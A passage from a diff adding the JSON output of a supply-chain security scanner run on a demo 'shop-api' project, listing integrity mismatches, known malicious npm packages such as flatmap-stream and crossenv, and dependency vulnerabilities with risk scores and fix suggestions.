@@ -1,0 +1,5075 @@
+{
+  "schema": "guardian.report/v1",
+  "tool": "supply-chain-guardian 0.1.0",
+  "generated_at": "2026-11-24T05:13:07Z",
+  "project": "shop-api@1.4.0",
+  "provenance": {
+    "generated_at": "2026-11-24T04:54:28Z",
+    "tool": "supply-chain-guardian 0.1.0",
+    "command": "python3 -m guardian run demo/compromised -o /home/claude/runs/demo --baseline demo/baseline/package-lock.json --verify-registry",
+    "project_dir": "/home/claude/guardian/demo/compromised",
+    "git": null,
+    "inputs": [
+      {
+        "path": "package.json",
+        "sha256": "74c00f2dbe29965b46ce0bfed4e864ecf1403eb957d520c3bbf13528e8a5055a",
+        "git_tracked": false
+      },
+      {
+        "path": "package-lock.json",
+        "sha256": "f330d2b9980d968a81946a68af6628a7348e92bdb277418d099f3ef476091c05",
+        "git_tracked": false
+      },
+      {
+        "path": "Dockerfile",
+        "sha256": "e1c58590c9f88232b1af45ddd5fd1923f0c00b6d1acf80fc2bf190dbc1546ad1",
+        "git_tracked": false
+      },
+      {
+        "path": ".github/workflows/ci.yml",
+        "sha256": "6c1b6d9e9547bd286daa8073157dcd5b1f6067e850a55f285275bff7a17e89fc",
+        "git_tracked": false
+      }
+    ]
+  },
+  "inventory": {
+    "components": 157,
+    "direct": 14,
+    "transitive": 143,
+    "by_ecosystem": {
+      "npm": 152,
+      "docker": 2,
+      "github-actions": 3
+    },
+    "by_scope": {
+      "dev": 81,
+      "prod": 72,
+      "build": 1,
+      "ci": 3
+    },
+    "edges": 211,
+    "unreachable_from_root": 1,
+    "max_depth": 6
+  },
+  "coverage_notes": [],
+  "findings_summary": {
+    "total": 75,
+    "by_severity": {
+      "critical": 10,
+      "high": 31,
+      "medium": 18,
+      "low": 12,
+      "info": 4
+    },
+    "by_category": {
+      "install-script": 3,
+      "integrity": 8,
+      "malicious-package": 4,
+      "vulnerability": 44,
+      "cicd": 4,
+      "typosquat": 1,
+      "unexpected-dependency": 7,
+      "untrusted-image": 4
+    }
+  },
+  "analysis": {
+    "summary": {
+      "P1-urgent": 18,
+      "P2-high": 19,
+      "P3-medium": 19,
+      "P4-low": 19
+    },
+    "ai": {
+      "provider": "none",
+      "model": "",
+      "enabled": false,
+      "prompt": "prompts/analyst_system.md",
+      "prompt_sha": "0e912c410a71",
+      "calls": 0,
+      "accepted": 0,
+      "rejected": 0,
+      "errors": 0
+    },
+    "context": {
+      "source_files_scanned": 1,
+      "subprojects": [
+        ""
+      ],
+      "exposed_ports": [],
+      "packages_imported_by_prod_code": {
+        "<root>": 1
+      }
+    },
+    "urgent": [
+      "GRD-704d795f51",
+      "GRD-613706260e",
+      "GRD-98f61e9402",
+      "GRD-0ed05bf1fe",
+      "GRD-73005cb429",
+      "GRD-2dd08017e5",
+      "GRD-21c00fec6e",
+      "GRD-ae3966a225",
+      "GRD-ca39c1eed2",
+      "GRD-b38171a52f",
+      "GRD-7c9e777fa6",
+      "GRD-1c5fa4dd94",
+      "GRD-e29370793e",
+      "GRD-1f7ff0a614",
+      "GRD-c83abdd646",
+      "GRD-d59b7c1df8",
+      "GRD-575e3b161a",
+      "GRD-ad2936893a"
+    ]
+  },
+  "top_risks": [
+    {
+      "finding_id": "GRD-704d795f51",
+      "title": "Integrity hash changed for unchanged version lodash@4.17.15",
+      "category": "integrity",
+      "rule": "CHANGE-INTEGRITY",
+      "severity": "critical",
+      "component": {
+        "id": "pkg:npm/lodash@4.17.15",
+        "name": "lodash",
+        "version": "4.17.15",
+        "ecosystem": "npm",
+        "direct": true,
+        "scope": "prod"
+      },
+      "score": 100,
+      "priority": "P1-urgent",
+      "factors": [
+        {
+          "factor": "severity",
+          "points": 90,
+          "why": "detector severity 'critical'"
+        },
+        {
+          "factor": "exposure",
+          "points": 5,
+          "why": "executes at install time on developer and CI machines (scope does not reduce this)"
+        },
+        {
+          "factor": "tamper-signal",
+          "points": 10,
+          "why": "same version, different bytes: possible tampering"
+        }
+      ],
+      "confidence": {
+        "value": 0.8,
+        "label": "high",
+        "reasons": [
+          "reachability unknown"
+        ]
+      },
+      "reachability": {
+        "level": "unknown",
+        "detail": "'lodash' not imported but referenced in package.json (CLI / config use)",
+        "files": []
+      },
+      "exposure": {
+        "context": "server",
+        "production": true,
+        "detail": "runs in the server process"
+      },
+      "production": true,
+      "fix": {
+        "suggestion": "same version must always have the same bytes: treat as tampering, restore baseline lockfile"
+      },
+      "dependency_paths": [
+        [
+          "shop-api@1.4.0",
+          "lodash@4.17.15"
+        ]
+      ],
+      "ai": {
+        "by": "deterministic-template",
+        "accepted": true,
+        "summary": "Integrity hash changed for unchanged version lodash@4.17.15. It enters the app via shop-api@1.4.0 > lodash@4.17.15.",
+        "exploitability": "No CVSS vector available; exploitability not assessed.",
+        "reachability": "unknown: 'lodash' not imported but referenced in package.json (CLI / config use). Exposure: server: runs in the server process.",
+        "recommended_priority": "P1-urgent",
+        "priority_change_reason": "",
+        "cited_evidence": [
+          "E3",
+          "E4",
+          "E5"
+        ],
+        "unknowns": [],
+        "confidence": "medium"
+      }
+    },
+    {
+      "finding_id": "GRD-613706260e",
+      "title": "Known malicious package in flatmap-stream@0.1.1: Malicious Package in flatmap-stream",
+      "category": "malicious-package",
+      "rule": "MAL-KNOWN",
+      "severity": "critical",
+      "component": {
+        "id": "pkg:npm/flatmap-stream@0.1.1",
+        "name": "flatmap-stream",
+        "version": "0.1.1",
+        "ecosystem": "npm",
+        "direct": false,
+        "scope": "prod"
+      },
+      "score": 100,
+      "priority": "P1-urgent",
+      "factors": [
+        {
+          "factor": "malicious",
+          "points": 100,
+          "why": "known malicious package: always urgent"
+        }
+      ],
+      "confidence": {
+        "value": 0.9,
+        "label": "high",
+        "reasons": [
+          "reachability unknown"
+        ]
+      },
+      "reachability": {
+        "level": "unknown",
+        "detail": "'event-stream' not imported but referenced in package.json (CLI / config use)",
+        "files": []
+      },
+      "exposure": {
+        "context": "server",
+        "production": true,
+        "detail": "runs in the server process"
+      },
+      "production": true,
+      "fix": {
+        "fixed_versions": [],
+        "available": false,
+        "introduced_via": [
+          "event-stream@3.3.6"
+        ],
+        "cvss_score": 9.8,
+        "cwe": [
+          "CWE-506"
+        ]
+      },
+      "dependency_paths": [
+        [
+          "shop-api@1.4.0",
+          "event-stream@3.3.6",
+          "flatmap-stream@0.1.1"
+        ]
+      ],
+      "ai": {
+        "by": "deterministic-template",
+        "accepted": true,
+        "summary": "Known malicious package in flatmap-stream@0.1.1: Malicious Package in flatmap-stream. It enters the app via shop-api@1.4.0 > event-stream@3.3.6 > flatmap-stream@0.1.1.",
+        "exploitability": "No CVSS vector available; exploitability not assessed.",
+        "reachability": "unknown: 'event-stream' not imported but referenced in package.json (CLI / config use). Exposure: server: runs in the server process.",
+        "recommended_priority": "P1-urgent",
+        "priority_change_reason": "",
+        "cited_evidence": [
+          "E1",
+          "E4",
+          "E5",
+          "E6"
+        ],
+        "unknowns": [],
+        "confidence": "medium"
+      }
+    },
+    {
+      "finding_id": "GRD-98f61e9402",
+      "title": "Known malicious package in ua-parser-js@0.7.29: Embedded malware in ua-parser-js",
+      "category": "malicious-package",
+      "rule": "MAL-KNOWN",
+      "severity": "critical",
+      "component": {
+        "id": "pkg:npm/ua-parser-js@0.7.29",
+        "name": "ua-parser-js",
+        "version": "0.7.29",
+        "ecosystem": "npm",
+        "direct": false,
+        "scope": "prod"
+      },
+      "score": 100,
+      "priority": "P1-urgent",
+      "factors": [
+        {
+          "factor": "malicious",
+          "points": 100,
+          "why": "known malicious package: always urgent"
+        }
+      ],
+      "confidence": {
+        "value": 0.9,
+        "label": "high",
+        "reasons": [
+          "verified advisory + exact version + reachability evidence"
+        ]
+      },
+      "reachability": {
+        "level": "orphan",
+        "detail": "no dependency path from the application",
+        "files": []
+      },
+      "exposure": {
+        "context": "server",
+        "production": true,
+        "detail": "runs in the server process"
+      },
+      "production": true,
+      "fix": {
+        "fixed_versions": [
+          "0.7.30"
+        ],
+        "available": true,
+        "introduced_via": [],
+        "cvss_score": 8.8,
+        "cwe": [
+          "CWE-506",
+          "CWE-912"
+        ]
+      },
+      "dependency_paths": [],
+      "ai": {
+        "by": "deterministic-template",
+        "accepted": true,
+        "summary": "Known malicious package in ua-parser-js@0.7.29: Embedded malware in ua-parser-js. A fixed version exists (0.7.30).",
+        "exploitability": "No CVSS vector available; exploitability not assessed.",
+        "reachability": "orphan: no dependency path from the application. Exposure: server: runs in the server process.",
+        "recommended_priority": "P1-urgent",
+        "priority_change_reason": "",
+        "cited_evidence": [
+          "E1",
+          "E4",
+          "E5"
+        ],
+        "unknowns": [],
+        "confidence": "medium"
+      }
+    },
+    {
+      "finding_id": "GRD-0ed05bf1fe",
+      "title": "Known vulnerability in event-stream@3.3.6: Critical severity vulnerability that affects event-stream and flatmap-stream",
+      "category": "vulnerability",
+      "rule": "VULN-KNOWN",
+      "severity": "critical",
+      "component": {
+        "id": "pkg:npm/event-stream@3.3.6",
+        "name": "event-stream",
+        "version": "3.3.6",
+        "ecosystem": "npm",
+        "direct": true,
+        "scope": "prod"
+      },
+      "score": 100,
+      "priority": "P1-urgent",
+      "factors": [
+        {
+          "factor": "severity",
+          "points": 98,
+          "why": "CVSS 9.8"
+        },
+        {
+          "factor": "exploitability",
+          "points": 5,
+          "why": "remotely exploitable without credentials or user action (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)"
+        },
+        {
+          "factor": "reachability",
+          "points": -10,
+          "why": "no import found (weak evidence: may be loaded dynamically or via CLI): 'event-stream' not imported but referenced in package.json (CLI / config use)"
+        },
+        {
+          "factor": "exposure",
+          "points": 10,
+          "why": "runs in a network-facing server process (runs in the server process)"
+        }
+      ],
+      "confidence": {
+        "value": 0.75,
+        "label": "medium",
+        "reasons": [
+          "version match only; vulnerable function use not proven",
+          "reachability unknown"
+        ]
+      },
+      "reachability": {
+        "level": "unknown",
+        "detail": "'event-stream' not imported but referenced in package.json (CLI / config use)",
+        "files": []
+      },
+      "exposure": {
+        "context": "server",
+        "production": true,
+        "detail": "runs in the server process"
+      },
+      "production": true,
+      "fix": {
+        "fixed_versions": [
+          "4.0.0"
+        ],
+        "available": true,
+        "introduced_via": [
+          "event-stream@3.3.6"
+        ],
+        "cvss_score": 9.8,
+        "cwe": [
+          "CWE-506"
+        ]
+      },
+      "dependency_paths": [
+        [
+          "shop-api@1.4.0",
+          "event-stream@3.3.6"
+        ]
+      ],
+      "ai": {
+        "by": "deterministic-template",
+        "accepted": true,
+        "summary": "Known vulnerability in event-stream@3.3.6: Critical severity vulnerability that affects event-stream and flatmap-stream. It enters the app via shop-api@1.4.0 > event-stream@3.3.6. A fixed version exists (4.0.0).",
+        "exploitability": "remotely exploitable without credentials or user action (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)",
+        "reachability": "unknown: 'event-stream' not imported but referenced in package.json (CLI / config use). Exposure: server: runs in the server process.",
+        "recommended_priority": "P1-urgent",
+        "priority_change_reason": "",
+        "cited_evidence": [
+          "E1",
+          "E4",
+          "E5",
+          "E6"
+        ],
+        "unknowns": [
+          "whether the vulnerable function is actually called (function-level reachability)"
+        ],
+        "confidence": "medium"
+      }
+    },
+    {
+      "finding_id": "GRD-73005cb429",
+      "title": "Known vulnerability in flatmap-stream@0.1.1: Critical severity vulnerability that affects event-stream and flatmap-stream",
+      "category": "vulnerability",
+      "rule": "VULN-KNOWN",
+      "severity": "critical",
+      "component": {
+        "id": "pkg:npm/flatmap-stream@0.1.1",
+        "name": "flatmap-stream",
+        "version": "0.1.1",
+        "ecosystem": "npm",
+        "direct": false,
+        "scope": "prod"
+      },
+      "score": 100,
+      "priority": "P1-urgent",
+      "factors": [
+        {
+          "factor": "severity",
+          "points": 98,
+          "why": "CVSS 9.8"
+        },
+        {
+          "factor": "exploitability",
+          "points": 5,
+          "why": "remotely exploitable without credentials or user action (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)"
+        },
+        {
+          "factor": "reachability",
+          "points": -10,
+          "why": "no import found (weak evidence: may be loaded dynamically or via CLI): 'event-stream' not imported but referenced in package.json (CLI / config use)"
+        },
+        {
+          "factor": "exposure",
+          "points": 10,
+          "why": "runs in a network-facing server process (runs in the server process)"
+        }
+      ],
+      "confidence": {
+        "value": 0.75,
+        "label": "medium",
+        "reasons": [
+          "version match only; vulnerable function use not proven",
+          "reachability unknown"
+        ]
+      },
+      "reachability": {
+        "level": "unknown",
+        "detail": "'event-stream' not imported but referenced in package.json (CLI / config use)",
+        "files": []
+      },
+      "exposure": {
+        "context": "server",
+        "production": true,
+        "detail": "runs in the server process"
+      },
+      "production": true,
+      "fix": {
+        "fixed_versions": [],
+        "available": false,
+        "introduced_via": [
+          "event-stream@3.3.6"
+        ],
+        "cvss_score": 9.8,
+        "cwe": [
+          "CWE-506"
+        ]
+      },
+      "dependency_paths": [
+        [
+          "shop-api@1.4.0",
+          "event-stream@3.3.6",
+          "flatmap-stream@0.1.1"
+        ]
+      ],
+      "ai": {
+        "by": "deterministic-template",
+        "accepted": true,
+        "summary": "Known vulnerability in flatmap-stream@0.1.1: Critical severity vulnerability that affects event-stream and flatmap-stream. It enters the app via shop-api@1.4.0 > event-stream@3.3.6 > flatmap-stream@0.1.1.",
+        "exploitability": "remotely exploitable without credentials or user action (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)",
+        "reachability": "unknown: 'event-stream' not imported but referenced in package.json (CLI / config use). Exposure: server: runs in the server process.",
+        "recommended_priority": "P1-urgent",
+        "priority_change_reason": "",
+        "cited_evidence": [
+          "E1",
+          "E4",
+          "E5",
+          "E6"
+        ],
+        "unknowns": [
+          "whether the vulnerable function is actually called (function-level reachability)"
+        ],
+        "confidence": "medium"
+      }
+    },
+    {
+      "finding_id": "GRD-2dd08017e5",
+      "title": "Known vulnerability in minimist@1.2.5: Prototype Pollution in minimist",
+      "category": "vulnerability",
+      "rule": "VULN-KNOWN",
+      "severity": "critical",
+      "component": {
+        "id": "pkg:npm/minimist@1.2.5",
+        "name": "minimist",
+        "version": "1.2.5",
+        "ecosystem": "npm",
+        "direct": true,
+        "scope": "prod"
+      },
+      "score": 100,
+      "priority": "P1-urgent",
+      "factors": [
+        {
+          "factor": "severity",
+          "points": 98,
+          "why": "CVSS 9.8"
+        },
+        {
+          "factor": "exploitability",
+          "points": 5,
+          "why": "remotely exploitable without credentials or user action (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)"
+        },
+        {
+          "factor": "reachability",
+          "points": -10,
+          "why": "no import found (weak evidence: may be loaded dynamically or via CLI): 'minimist' not imported but referenced in package.json (CLI / config use)"
+        },
+        {
+          "factor": "exposure",
+          "points": 10,
+          "why": "runs in a network-facing server process (runs in the server process)"
+        }
+      ],
+      "confidence": {
+        "value": 0.75,
+        "label": "medium",
+        "reasons": [
+          "version match only; vulnerable function use not proven",
+          "reachability unknown"
+        ]
+      },
+      "reachability": {
+        "level": "unknown",
+        "detail": "'minimist' not imported but referenced in package.json (CLI / config use)",
+        "files": []
+      },
+      "exposure": {
+        "context": "server",
+        "production": true,
+        "detail": "runs in the server process"
+      },
+      "production": true,
+      "fix": {
+        "fixed_versions": [
+          "1.2.6"
+        ],
+        "available": true,
+        "introduced_via": [
+          "minimist@1.2.5"
+        ],
+        "cvss_score": 9.8,
+        "cwe": [
+          "CWE-1321"
+        ]
+      },
+      "dependency_paths": [
+        [
+          "shop-api@1.4.0",
+          "minimist@1.2.5"
+        ]
+      ],
+      "ai": {
+        "by": "deterministic-template",
+        "accepted": true,
+        "summary": "Known vulnerability in minimist@1.2.5: Prototype Pollution in minimist. It enters the app via shop-api@1.4.0 > minimist@1.2.5. A fixed version exists (1.2.6).",
+        "exploitability": "remotely exploitable without credentials or user action (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)",
+        "reachability": "unknown: 'minimist' not imported but referenced in package.json (CLI / config use). Exposure: server: runs in the server process.",
+        "recommended_priority": "P1-urgent",
+        "priority_change_reason": "",
+        "cited_evidence": [
+          "E1",
+          "E4",
+          "E5",
+          "E6"
+        ],
+        "unknowns": [
+          "whether the vulnerable function is actually called (function-level reachability)"
+        ],
+        "confidence": "medium"
+      }
+    },
+    {
+      "finding_id": "GRD-21c00fec6e",
+      "title": "Lockfile hash for lodash@4.17.15 does not match the registry",
+      "category": "integrity",
+      "rule": "INTEGRITY-REGISTRY-MISMATCH",
+      "severity": "critical",
+      "component": {
+        "id": "pkg:npm/lodash@4.17.15",
+        "name": "lodash",
+        "version": "4.17.15",
+        "ecosystem": "npm",
+        "direct": true,
+        "scope": "prod"
+      },
+      "score": 100,
+      "priority": "P1-urgent",
+      "factors": [
+        {
+          "factor": "severity",
+          "points": 90,
+          "why": "detector severity 'critical'"
+        },
+        {
+          "factor": "exposure",
+          "points": 5,
+          "why": "executes at install time on developer and CI machines (scope does not reduce this)"
+        },
+        {
+          "factor": "tamper-signal",
+          "points": 10,
+          "why": "same version, different bytes: possible tampering"
+        }
+      ],
+      "confidence": {
+        "value": 0.8,
+        "label": "high",
+        "reasons": [
+          "reachability unknown"
+        ]
+      },
+      "reachability": {
+        "level": "unknown",
+        "detail": "'lodash' not imported but referenced in package.json (CLI / config use)",
+        "files": []
+      },
+      "exposure": {
+        "context": "server",
+        "production": true,
+        "detail": "runs in the server process"
+      },
+      "production": true,
+      "fix": {
+        "suggestion": "treat as tampering: do not install; restore lockfile from trusted commit"
+      },
+      "dependency_paths": [
+        [
+          "shop-api@1.4.0",
+          "lodash@4.17.15"
+        ]
+      ],
+      "ai": {
+        "by": "deterministic-template",
+        "accepted": true,
+        "summary": "Lockfile hash for lodash@4.17.15 does not match the registry. It enters the app via shop-api@1.4.0 > lodash@4.17.15.",
+        "exploitability": "No CVSS vector available; exploitability not assessed.",
+        "reachability": "unknown: 'lodash' not imported but referenced in package.json (CLI / config use). Exposure: server: runs in the server process.",
+        "recommended_priority": "P1-urgent",
+        "priority_change_reason": "",
+        "cited_evidence": [
+          "E3",
+          "E4",
+          "E5"
+        ],
+        "unknowns": [],
+        "confidence": "medium"
+      }
+    },
+    {
+      "finding_id": "GRD-ae3966a225",
+      "title": "crossenv was taken down by npm security (malicious package)",
+      "category": "malicious-package",
+      "rule": "REGISTRY-SECURITY-HOLDER",
+      "severity": "critical",
+      "component": {
+        "id": "pkg:npm/crossenv@6.1.1",
+        "name": "crossenv",
+        "version": "6.1.1",
+        "ecosystem": "npm",
+        "direct": true,
+        "scope": "dev"
+      },
+      "score": 100,
+      "priority": "P1-urgent",
+      "factors": [
+        {
+          "factor": "malicious",
+          "points": 100,
+          "why": "known malicious package: always urgent"
+        }
+      ],
+      "confidence": {
+        "value": 0.9,
+        "label": "high",
+        "reasons": [
+          "reachability unknown"
+        ]
+      },
+      "reachability": {
+        "level": "unknown",
+        "detail": "'crossenv' not imported but referenced in package.json (CLI / config use)",
+        "files": []
+      },
+      "exposure": {
+        "context": "dev-tooling",
+        "production": false,
+        "detail": "devDependency: not installed in production"
+      },
+      "production": false,
+      "fix": {
+        "suggestion": "remove immediately; rotate any secrets present on machines that installed it"
+      },
+      "dependency_paths": [
+        [
+          "shop-api@1.4.0",
+          "crossenv@6.1.1"
+        ]
+      ],
+      "ai": {
+        "by": "deterministic-template",
+        "accepted": true,
+        "summary": "crossenv was taken down by npm security (malicious package). It enters the app via shop-api@1.4.0 > crossenv@6.1.1.",
+        "exploitability": "No CVSS vector available; exploitability not assessed.",
+        "reachability": "unknown: 'crossenv' not imported but referenced in package.json (CLI / config use). Exposure: dev-tooling: devDependency: not installed in production.",
+        "recommended_priority": "P1-urgent",
+        "priority_change_reason": "",
+        "cited_evidence": [
+          "E3",
+          "E4",
+          "E5"
+        ],
+        "unknowns": [],
+        "confidence": "medium"
+      }
+    },
+    {
+      "finding_id": "GRD-ca39c1eed2",
+      "title": "flatmap-stream was taken down by npm security (malicious package)",
+      "category": "malicious-package",
+      "rule": "REGISTRY-SECURITY-HOLDER",
+      "severity": "critical",
+      "component": {
+        "id": "pkg:npm/flatmap-stream@0.1.1",
+        "name": "flatmap-stream",
+        "version": "0.1.1",
+        "ecosystem": "npm",
+        "direct": false,
+        "scope": "prod"
+      },
+      "score": 100,
+      "priority": "P1-urgent",
+      "factors": [
+        {
+          "factor": "malicious",
+          "points": 100,
+          "why": "known malicious package: always urgent"
+        }
+      ],
+      "confidence": {
+        "value": 0.9,
+        "label": "high",
+        "reasons": [
+          "reachability unknown"
+        ]
+      },
+      "reachability": {
+        "level": "unknown",
+        "detail": "'event-stream' not imported but referenced in package.json (CLI / config use)",
+        "files": []
+      },
+      "exposure": {
+        "context": "server",
+        "production": true,
+        "detail": "runs in the server process"
+      },
+      "production": true,
+      "fix": {
+        "suggestion": "remove immediately; rotate any secrets present on machines that installed it"
+      },
+      "dependency_paths": [
+        [
+          "shop-api@1.4.0",
+          "event-stream@3.3.6",
+          "flatmap-stream@0.1.1"
+        ]
+      ],
+      "ai": {
+        "by": "deterministic-template",
+        "accepted": true,
+        "summary": "flatmap-stream was taken down by npm security (malicious package). It enters the app via shop-api@1.4.0 > event-stream@3.3.6 > flatmap-stream@0.1.1.",
+        "exploitability": "No CVSS vector available; exploitability not assessed.",
+        "reachability": "unknown: 'event-stream' not imported but referenced in package.json (CLI / config use). Exposure: server: runs in the server process.",
+        "recommended_priority": "P1-urgent",
+        "priority_change_reason": "",
+        "cited_evidence": [
+          "E3",
+          "E4",
+          "E5"
+        ],
+        "unknowns": [],
+        "confidence": "medium"
+      }
+    },
+    {
+      "finding_id": "GRD-b38171a52f",
+      "title": "Known vulnerability in body-parser@1.19.0: body-parser vulnerable to Denial of Service via trailing bytes after a compressed request body",
+      "category": "vulnerability",
+      "rule": "VULN-KNOWN",
+      "severity": "high",
+      "component": {
+        "id": "pkg:npm/body-parser@1.19.0",
+        "name": "body-parser",
+        "version": "1.19.0",
+        "ecosystem": "npm",
+        "direct": false,
+        "scope": "prod"
+      },
+      "score": 95,
+      "priority": "P1-urgent",
+      "factors": [
+        {
+          "factor": "severity",
+          "points": 75,
+          "why": "CVSS 7.5"
+        },
+        {
+          "factor": "exploitability",
+          "points": 5,
+          "why": "remotely exploitable without credentials or user action (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H)"
+        },
+        {
+          "factor": "reachability",
+          "points": 5,
+          "why": "pulled in by a dependency that production code imports: pulled in by 'express', which production code imports (server.js)"
+        },
+        {
+          "factor": "exposure",
+          "points": 10,
+          "why": "runs in a network-facing server process (runs in the server process)"
+        }
+      ],
+      "confidence": {
+        "value": 0.85,
+        "label": "high",
+        "reasons": [
+          "version match only; vulnerable function use not proven"
+        ]
+      },
+      "reachability": {
+        "level": "parent-imported",
+        "detail": "pulled in by 'express', which production code imports (server.js)",
+        "files": [
+          "server.js"
+        ],
+        "via": "express"
+      },
+      "exposure": {
+        "context": "server",
+        "production": true,
+        "detail": "runs in the server process"
+      },
+      "production": true,
+      "fix": {
+        "fixed_versions": [
+          "1.20.9"
+        ],
+        "available": true,
+        "introduced_via": [
+          "express@4.17.1"
+        ],
+        "cvss_score": 7.5,
+        "cwe": [
+          "CWE-248"
+        ]
+      },
+      "dependency_paths": [
+        [
+          "shop-api@1.4.0",
+          "express@4.17.1",
+          "body-parser@1.19.0"
+        ]
+      ],
+      "ai": {
+        "by": "deterministic-template",
+        "accepted": true,
+        "summary": "Known vulnerability in body-parser@1.19.0: body-parser vulnerable to Denial of Service via trailing bytes after a compressed request body. It enters the app via shop-api@1.4.0 > express@4.17.1 > body-parser@1.19.0. A fixed version exists (1.20.9).",
+        "exploitability": "remotely exploitable without credentials or user action (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H)",
+        "reachability": "parent-imported: pulled in by 'express', which production code imports (server.js). Exposure: server: runs in the server process.",
+        "recommended_priority": "P1-urgent",
+        "priority_change_reason": "",
+        "cited_evidence": [
+          "E1",
+          "E4",
+          "E5",
+          "E6"
+        ],
+        "unknowns": [
+          "whether the vulnerable function is actually called (function-level reachability)"
+        ],
+        "confidence": "medium"
+      }
+    },
+    {
+      "finding_id": "GRD-7c9e777fa6",
+      "title": "Known vulnerability in body-parser@1.19.0: body-parser vulnerable to denial of service when url encoding is enabled",
+      "category": "vulnerability",
+      "rule": "VULN-KNOWN",
+      "severity": "high",
+      "component": {
+        "id": "pkg:npm/body-parser@1.19.0",
+        "name": "body-parser",
+        "version": "1.19.0",
+        "ecosystem": "npm",
+        "direct": false,
+        "scope": "prod"
+      },
+      "score": 95,
+      "priority": "P1-urgent",
+      "factors": [
+        {
+          "factor": "severity",
+          "points": 75,
+          "why": "CVSS 7.5"
+        },
+        {
+          "factor": "exploitability",
+          "points": 5,
+          "why": "remotely exploitable without credentials or user action (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H)"
+        },
+        {
+          "factor": "reachability",
+          "points": 5,
+          "why": "pulled in by a dependency that production code imports: pulled in by 'express', which production code imports (server.js)"
+        },
+        {
+          "factor": "exposure",
+          "points": 10,
+          "why": "runs in a network-facing server process (runs in the server process)"
+        }
+      ],
+      "confidence": {
+        "value": 0.85,
+        "label": "high",
+        "reasons": [
+          "version match only; vulnerable function use not proven"
+        ]
+      },
+      "reachability": {
+        "level": "parent-imported",
+        "detail": "pulled in by 'express', which production code imports (server.js)",
+        "files": [
+          "server.js"
+        ],
+        "via": "express"
+      },
+      "exposure": {
+        "context": "server",
+        "production": true,
+        "detail": "runs in the server process"
+      },
+      "production": true,
+      "fix": {
+        "fixed_versions": [
+          "1.20.3"
+        ],
+        "available": true,
+        "introduced_via": [
+          "express@4.17.1"
+        ],
+        "cvss_score": 7.5,
+        "cwe": [
+          "CWE-405"
+        ]
+      },
+      "dependency_paths": [
+        [
+          "shop-api@1.4.0",
+          "express@4.17.1",
+          "body-parser@1.19.0"
+        ]
+      ],
+      "ai": {
+        "by": "deterministic-template",
+        "accepted": true,
+        "summary": "Known vulnerability in body-parser@1.19.0: body-parser vulnerable to denial of service when url encoding is enabled. It enters the app via shop-api@1.4.0 > express@4.17.1 > body-parser@1.19.0. A fixed version exists (1.20.3).",
+        "exploitability": "remotely exploitable without credentials or user action (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H)",
+        "reachability": "parent-imported: pulled in by 'express', which production code imports (server.js). Exposure: server: runs in the server process.",
+        "recommended_priority": "P1-urgent",
+        "priority_change_reason": "",
+        "cited_evidence": [
+          "E1",
+          "E4",
+          "E5",
+          "E6"
+        ],
+        "unknowns": [
+          "whether the vulnerable function is actually called (function-level reachability)"
+        ],
+        "confidence": "medium"
+      }
+    },
+    {
+      "finding_id": "GRD-1c5fa4dd94",
+      "title": "Known vulnerability in path-to-regexp@0.1.7: path-to-regexp contains a ReDoS",
+      "category": "vulnerability",
+      "rule": "VULN-KNOWN",
+      "severity": "high",
+      "component": {
+        "id": "pkg:npm/path-to-regexp@0.1.7",
+        "name": "path-to-regexp",
+        "version": "0.1.7",
+        "ecosystem": "npm",
+        "direct": false,
+        "scope": "prod"
+      },
+      "score": 95,
+      "priority": "P1-urgent",
+      "factors": [
+        {
+          "factor": "severity",
+          "points": 75,
+          "why": "CVSS 7.5"
+        },
+        {
+          "factor": "exploitability",
+          "points": 5,
+          "why": "remotely exploitable without credentials or user action (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H)"
+        },
+        {
+          "factor": "reachability",
+          "points": 5,
+          "why": "pulled in by a dependency that production code imports: pulled in by 'express', which production code imports (server.js)"
+        },
+        {
+          "factor": "exposure",
+          "points": 10,
+          "why": "runs in a network-facing server process (runs in the server process)"
+        }
+      ],
+      "confidence": {
+        "value": 0.85,
+        "label": "high",
+        "reasons": [
+          "version match only; vulnerable function use not proven"
+        ]
+      },
+      "reachability": {
+        "level": "parent-imported",
+        "detail": "pulled in by 'express', which production code imports (server.js)",
+        "files": [
+          "server.js"
+        ],
+        "via": "express"
+      },
+      "exposure": {
+        "context": "server",
+        "production": true,
+        "detail": "runs in the server process"
+      },
+      "production": true,
+      "fix": {
+        "fixed_versions": [
+          "0.1.12"
+        ],
+        "available": true,
+        "introduced_via": [
+          "express@4.17.1"
+        ],
+        "cvss_score": 7.5,
+        "cwe": [
+          "CWE-1333"
+        ]
+      },
+      "dependency_paths": [
+        [
+          "shop-api@1.4.0",
+          "express@4.17.1",
+          "path-to-regexp@0.1.7"
+        ]
+      ],
+      "ai": {
+        "by": "deterministic-template",
+        "accepted": true,
+        "summary": "Known vulnerability in path-to-regexp@0.1.7: path-to-regexp contains a ReDoS. It enters the app via shop-api@1.4.0 > express@4.17.1 > path-to-regexp@0.1.7. A fixed version exists (0.1.12).",
+        "exploitability": "remotely exploitable without credentials or user action (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H)",
+        "reachability": "parent-imported: pulled in by 'express', which production code imports (server.js). Exposure: server: runs in the server process.",
+        "recommended_priority": "P1-urgent",
+        "priority_change_reason": "",
+        "cited_evidence": [
+          "E1",
+          "E4",
+          "E5",
+          "E6"
+        ],
+        "unknowns": [
+          "whether the vulnerable function is actually called (function-level reachability)"
+        ],
+        "confidence": "medium"
+      }
+    },
+    {
+      "finding_id": "GRD-e29370793e",
+      "title": "Known vulnerability in path-to-regexp@0.1.7: path-to-regexp outputs backtracking regular expressions",
+      "category": "vulnerability",
+      "rule": "VULN-KNOWN",
+      "severity": "high",
+      "component": {
+        "id": "pkg:npm/path-to-regexp@0.1.7",
+        "name": "path-to-regexp",
+        "version": "0.1.7",
